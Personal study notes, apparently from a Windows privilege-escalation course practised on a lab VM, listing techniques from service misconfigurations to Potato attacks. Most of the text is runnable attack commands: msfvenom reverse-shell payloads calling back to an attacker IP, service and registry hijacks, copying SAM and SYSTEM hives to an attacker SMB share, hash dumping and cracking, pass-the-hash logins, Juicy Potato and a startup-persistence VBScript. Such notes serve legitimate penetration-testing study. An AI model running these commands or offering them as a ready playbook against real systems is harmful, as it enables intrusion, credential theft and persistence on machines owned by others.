Powershell SMB enable

Made this from the Privelege Escalation course from Tib3rius ⁣

Udemy link of his course:https://www.udemy.com/course/windows-privilege-escalation/

This was for a demo windows 10 machine, I used for practise.

> Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All

```zsh
python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools .

```
Generating reverse shell using msfvenom

```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.158.146 LPORT=53 -f exe -o reverse.exe
```

Permissions to access a certain resource in Windows are
controlled by the access control list (ACL) for that resource.
Each ACL is made up of zero or more access control entries
(ACEs).
Each ACE defines the relationship between a principal (e.g. a
user, group) and a certain access right.

To check your privilege on a system 
```cmd
whoami /priv
```
## Services Privilege Escalation

```cmd
.\winPEASany.exe quiet servicesinfo

```

```cmd
sc qc  daclsvc

```
Using accesschk.exe

-u Suppress errors
-v Verbose 
-c Windows service
-d Only process directories or top-level keys
-w Show objects which have right access 
-q Omit banner


```cmd
.\accesschk.exe /accepteula -uwcqv user daclsvc

```

For quering using sc

```cmd
 sc query daclsvc

```
### Insecure service Permissions

```cmd
 sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe""
```

### Unquoted Service Path

```cmd
 .\accesschk.exe /accepteula -uwdq C:\
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
 .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
```
### Weak Registry Permissions

```cmd
> .\accesschk.exe /accepteula -ucvq regsvc
```

```cmd
> powershell -exec bypass
```
```ps
 Get-Acl HKLM:\System\currentcontrolset\services\regsvc
 reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
 reg query HKEY_LOCAL_MACHINE\System\currentcontrolset\services\regsvc
```

### Insecure Service executables


```cmd

 .\accesschk.exe /accepteula -quvw "C:\ProgramFiles\File Permissions Service\filepermservice.exe"

```

```cmd
 .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```
```cmd
 copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```

### DLL Hijacking

```cmd
 .\accesschk.exe /accepteula -uvqc dllsvc
 sc qc dllsvc
```

```zsh
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.158.146 LPORT=53 -f dll -o hijackme.dll
```

## Registry Exploits

### Autoruns

If modifiable can and run with elevated privelges, we can have a root shell

```cmd 
 .\winPEASany.exe quiet applicationsinfo
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 ```
 ```cmd
 .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```
### Always Install Elevated

Need 2 things to be elevated
-HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer for the local system
and also for the current user
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

If any of them is missing you can use this


```cmd
 .\winPEASany.exe quiet windowscreds
or 
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Create a new msi reverse shell

```zsh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.158.146 LPORT=53 -f msi -o reverse.msi
```
```cmd
 msiexec /quiet /qn /i reverse.msi
```

## Passwords

A lot of admins repeat passwords and store it insecurely, it is worth finding them
Windows itself stores a lot of passwords in plaintext and it is worth looking at them

The following command will search registry for keys and values that contain "password"

Manual

```cmd
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s

```
Using winpeas as the above prints a lot of results and it is better to look at know locations 

```cmd
 .\winPEASany.exe quiet filesinfo userinfo
  
```
Windows runas commands allows users to execute commands as a different user if you have their password.
However, Windows also allows users to save passwords on the systems allowing the user to bypass this argument.

```cmd 
 savecred.bat
 cmdkey /list
```

### Configuration files

Some admins will leave config files on the system with passwords in them. eg Unattend.xml file

Recursively search for files in the current directory with
“pass” in the name, or ending in “.config”:

```cmd
 dir /s *pass* == *.config
```

Recursively search for files in the current directory that
contain the word “password” and also end in either .xml, .ini,
or .txt:
```cmd
 findstr /si password *.xml *.ini *.txt
```

Using win peas

```cmd
 .\winPEASany.exe quiet cmd searchfast filesinfo

```
### SAM

Windows stores password hashes in the Security Account Manager(SAM)
The hashes are encrypted with a key which can be found in a file called *System* (kind of a db)

SAM and SYSTEM files are located in the following location. They are locked when windows is running

***
     C:\Windows\System32\config 
***

Backup of these files. 

***
    C:\Windows\repair\SAM
    C:\Windows\repair\SYSTEM
***


```cmd
 copy C:\Windows\Repair\SYSTEM \\192.168.158.146\tools 
 copy C:\Windows\Repair\SAM \\192.168.158.146\tools 

```

Dumping Hashes using creddump7 suite

```zsh
 python2 pwdump.py /root/tools/SYSTEM /root/tools/SAM
```

On analysis the LM hashes are same meaning. They are empty and deprecated and the second part of the hash is the NTLM hash which is different for different users. If it begins 31d6 then it is for  a default account with no password or disabled.

Hashes can be cracked using hashcat

```zsh
hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
```

Login using winexe

```zsh
winexe -U 'admin%password123' --system //192.168.158.153 'C:\PrivEsc\reverse.exe'

```

### Passing the Hash
Windows accepts hashes instead of passwords to authenticate  to anumber of services. We can use a modified version of winexe, pth-winexe to spawn a command prompt as admin using admin hash

```zsh
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.158.153 cmd.exe
```
Please note to remove the dots in the end and anything between the username and the LM hash with a % symbol

```zsh
 pth-winexe --system  -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.158.153 cmd.exe
```

## Scheduled Tasks

Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon).Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users,including SYSTEM.

```cmd
 schtasks /query /fo LIST /v
```
In powershell

```ps
 Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

```
Just use your brain like happens in Linux cron jobs

## Insecure GUI Apps(Citrix Method)

On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges.
There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality.
Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges.
I call this the “Citrix Method” because it uses many of the same techniques used to break out of Citrix environments.

- Log into the Windows VM using the GUI with the “user” account.
- Double click on the “AdminPaint” shortcut on the Desktop.

Open a command prompt and run:
```cmd
 tasklist /V | findstr mspaint.exe 
```
Note that mspaint.exe is running with admin privileges.
Click on open files and just use cmd.exe since it is running as admin, it will spawn an admin shell

## Startup apps

A user can decide which apps are going to run automatically on startup which is

***
	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

***

```cmd
.\accesschk.exe /accepteula -d  "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

```

Startup files should be shortcuts or known as link files to work properly.
We can make a small VBscript to add a shortcut. Here is the code


```vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```
```cmd
 cscript CreateShortcut.vbs
```
## Using Installed Applications 

Using seatbelt

```cmd
.\seatbelt.exe NonstandardProcesses
```

Using winpeas

```cmd
 .\winPEASany.exe quiet procesinfo
```
Note proces is wrongly spelled. This is intended.

Use exploitdb to search for interesting ones. Simple


## Using Hot Potato

Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges.
The attack tricks Windows into authenticating as the SYSTEMuser to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution.
*This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.*


```cmd
.\potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true

```
-enable_httpserver : starts a fake HTTP server to intercept HTTP redirects for Win updates and
then grabs credentials by forcing to Window to reauthenticate and sends us the credentials via SMB
-enable_exhaust : starts exhausting UDP ports
-enable_spoof : enables NBS spoofer so DNS starts failing 

## Rotten/Juicy Potato

Service accounts can be given special privileges in order for them to run their services, and cannot be logged into directly.
Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.

Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user.
This was possible because service accounts usually have the *SeImpersonatePrivilege”* privilege enabled

For eg. IIS Runs with the privilegs of a service account , we can get a reverse shell from it


```cmd

C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-
49b8-abc6-03dd84127020}
```
For valid CSIDs visit this link
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md



